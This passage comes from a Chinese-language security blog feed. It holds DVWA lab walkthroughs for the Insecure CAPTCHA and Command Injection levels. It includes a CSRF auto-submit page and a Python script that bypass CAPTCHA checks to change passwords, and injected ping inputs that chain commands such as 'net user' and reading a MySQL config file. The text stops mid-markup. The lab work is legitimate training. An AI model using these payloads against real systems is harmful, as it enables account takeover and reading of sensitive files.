class="keyword">if</span>( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly </span></span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// Show next stage for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">" </span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; </span></span><br><span class="line"><span class="string">                &lt;form action=\"#\" method=\"POST\"&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt; </span></span><br><span class="line"><span class="string">                &lt;/form&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Both new passwords do not match. </span></span><br><span class="line">            $html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>; </span><br><span class="line">            $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if they did stage 1 </span></span><br><span class="line">    <span class="keyword">if</span>( !$_POST[ <span class="string">'passed_captcha'</span> ] ) &#123; </span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with the passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相较于上一关，这里多了一个对passed_captcha参数的验证，这个参数是通过用户输入正确的验证码后自动提交的一个参数，当然我们也可以利用burp自己构造</p><p>老规矩先抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改step参数，并且增加passed_captcha参数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改密码成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样的我们依然可以伪造CSRF攻击页面，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;attack-medium&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=&apos;transfer&apos; method=&apos;post&apos; action=&apos;http://127.0.0.1/dvwa/vulnerabilities/captcha/&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_new&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;password_conf&apos; value=&apos;password&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;passed_captcha&apos; value=&apos;true&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;step&apos; value=&apos;2&apos;&gt;</span><br><span class="line">&lt;input type=&apos;hidden&apos; name=&apos;Change&apos; value=&apos;Change&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">var test=document.getElementById(&apos;transfer&apos;);</span><br><span class="line">test.submit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Hide the CAPTCHA form</span><br><span class="line">$hide_form = true;</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$pass_new  = $_POST[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_POST[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Check CAPTCHA from 3rd party</span><br><span class="line">$resp = recaptcha_check_answer(</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ],</span><br><span class="line">$_POST[&apos;g-recaptcha-response&apos;]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">if (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos;</span><br><span class="line">&amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos;</span><br><span class="line">)</span><br><span class="line">)&#123;</span><br><span class="line">// CAPTCHA was correct. Do both new passwords match?</span><br><span class="line">if ($pass_new == $pass_conf) &#123;</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos; LIMIT 1;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for user</span><br><span class="line">$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">// Ops. Password mismatch</span><br><span class="line">$html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;</span><br><span class="line">$hide_form = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">// What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">$html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">$hide_form = false;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关没有了对step参数的检测，关键检测点在于语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos;</span><br><span class="line">&amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos;</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>如果这个if语句执行不了，那么就验证失败，无法修改密码，所以我们必须让这个if语句执行，也就是里面的逻辑语句为真，而里面的逻辑语句是由两个逻辑语句通过 || 拼接成的，所以我们只需要让其中一个逻辑语句为真，条件就可以成立，再看里面检测的参数，$resp参数明显是我们不可控的，所以我们只要将重点放在参数g-recaptcha-response和参数HTTP_USER_AGENT上面就行了，要让if语句执行，就控制参数g-recaptcha-response值为hidd3n_valu3，请求头的user_agent为reCAPTCHA</p><p>依然是抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后修改参数g-recaptcha-response和参数HTTP_USER_AGENT</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-Insecure-CAPTCHA/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>由于无法用javascript代码修改user_agent参数，所以无法用CSRF原理攻击</p><p>最后附上本关修改密码的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/captcha/"</span></span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: <span class="string">'103'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    <span class="string">'Origin'</span>: <span class="string">'http://127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'reCAPTCHA'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://127.0.0.1/dvwa/vulnerabilities/captcha/'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=842n4cnel00gbrkd5mi9fk98f6'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">    &#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'password_new'</span>:<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'password_conf'</span>:<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'g-recaptcha-response'</span>:<span class="string">'hidd3n_valu3'</span>,</span><br><span class="line">    <span class="string">'Change'</span>:<span class="string">'Change'</span></span><br><span class="line">    &#125;</span><br><span class="line">r=requests.post(url,headers=header,data=data)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">'Password Changed.'</span>) <span class="keyword">in</span> r.text:</span><br><span class="line">    print(<span class="string">'Password Changed.'</span>)</span><br></pre></td></tr></table></figure><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_new  = stripslashes( $pass_new ); </span><br><span class="line">    $pass_new  = mysql_real_escape_string( $pass_new ); </span><br><span class="line">    $pass_new  = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line">    $pass_conf = stripslashes( $pass_conf ); </span><br><span class="line">    $pass_conf = mysql_real_escape_string( $pass_conf ); </span><br><span class="line">    $pass_conf = md5( $pass_conf ); </span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ &apos;password_current&apos; ]; </span><br><span class="line">    $pass_curr = stripslashes( $pass_curr ); </span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr ); </span><br><span class="line">    $pass_curr = md5( $pass_curr ); </span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party </span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], </span><br><span class="line">        $_SERVER[ &apos;REMOTE_ADDR&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_challenge_field&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_response_field&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail? </span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Check that the current password is correct </span><br><span class="line">        $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); </span><br><span class="line">        $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        // Do both new password match and was the current password correct? </span><br><span class="line">        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; </span><br><span class="line">            // Update the database </span><br><span class="line">            $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); </span><br><span class="line">            $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">            // Feedback for the end user - success! </span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Feedback for the end user - failed! </span><br><span class="line">            echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">            $hide_form = false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出服务器采用了token认证机制，还采用了PDO防止SQL注入，更主要的是对于校验验证码的过程只检测了我们不可控的参数$resp-&gt;is_valid，可谓是非常完美的防御了各种漏洞。用户还必须输入当前的密码，更加完善了安全性</p>]]></content>
    
    <summary type="html">
    
      dvwa-Insecure CAPTCHA
    
    </summary>
    
      <category term="dvwa-Insecure CAPTCHA" scheme="https://Foxgrin.github.io/categories/dvwa-Insecure-CAPTCHA/"/>
    
    
      <category term="Insecure CAPTCHA" scheme="https://Foxgrin.github.io/tags/Insecure-CAPTCHA/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-Command Injection</title>
    <link href="https://Foxgrin.github.io//posts/63531/"/>
    <id>https://Foxgrin.github.io//posts/63531/</id>
    <published>2018-07-15T06:18:00.000Z</published>
    <updated>2018-07-15T09:55:42.115Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中命令注入漏洞的关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Submit&apos;]))&#123;</span><br><span class="line">$target=$_REQUEST[&apos;ip&apos;];</span><br><span class="line">if(stristr(php_uname(&apos;s&apos;),&apos;Windows NT&apos;))&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$cmd=shell_exec(&apos;ping -c 4 &apos;.$target);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;pre&gt;$cmd&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>了解这里的漏洞之前，我们还是先来了解一下一些函数的使用：</p><p>(1)stristr(string,search,before_search)：搜索一个字符串在另一个字符串中首次出现的位置的剩余部分，搜索失败返回false,其中参数string表示被搜索的字符串，search表示要搜索的字符串，before_search是可选参数，默认为false，如果设置为true则返回搜索字符串在被搜索字符串首次出现的位置的前面部分</p><p>例子如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo stristr(&apos;I love php&apos;,&apos;love&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p>搜索love在原字符串中首次出现位置的剩余部分，结果返回love php，验证结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)php_uname(mode)：返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 </p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> stristr(php_uname(<span class="string">'s'</span>),<span class="string">'Windows NT'</span>);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见源代码中对操作系统的名称进行了检测</p><p>(3)shell_exec(cmd)：在外部执行一个命令，参数cmd即为要执行的命令</p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=shell_exec(<span class="string">'ping 127.0.0.1'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$cmd&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>了解完这三个函数，我们就能大概了解这关是执行一个在浏览器上的ping命令程序，服务器会对操作系统的名称进行检测，如果不是Windows NT系统则执行linux系统的Ping命令。但是，由于服务器未对ip参数进行任何的过滤，因此存在严重的Command Injection(命令注入)漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们可以通过该漏洞执行我们想要执行的命令，但要保证前面ping命令格式的正确，再通过命令连接符跟上我们想要执行的命令在windows下 &amp;&amp;,&amp;,|,|| 都可以当做命令连接符，四者区别如下：</p><p>命令1 &amp;&amp; 命令2 ：先执行命令1，若命令1执行成功再执行命令2，若命令1执行不成功则不执行命令2</p><p>命令1 &amp; 命令2 ：先执行命令1，不管命令1执行成不成功都继续执行命令2</p><p>命令1 | 命令2 ：只执行命令2，前提是命令1必须执行成功</p><p>命令1 || 命令2 ：先执行命令1，若命令1执行成功则不执行命令2，若命令1执行不成功则执行命令2</p><p>然后我们就可以执行想要执行的命令了</p><p>例如要获取用户信息</p><p>输入127.0.0.1 &amp;&amp; net user</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取ip地址信息</p><p>输入127.0.0.1 &amp;&amp; ipconfig</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取arp表信息</p><p>输入127.0.0.1 &amp;&amp; arp -a</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以利用type命令查看一些配置文件内容，前提是已经文件绝对路径</p><p>例如查看mysql配置信息</p><p>输入127.0.0.1 | type C:\phpStudy\PHPTutorial\MySQL\my.ini</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-command-injection/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见，该漏洞的危害是很大的，攻击者可以执行任意想执行的命令</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 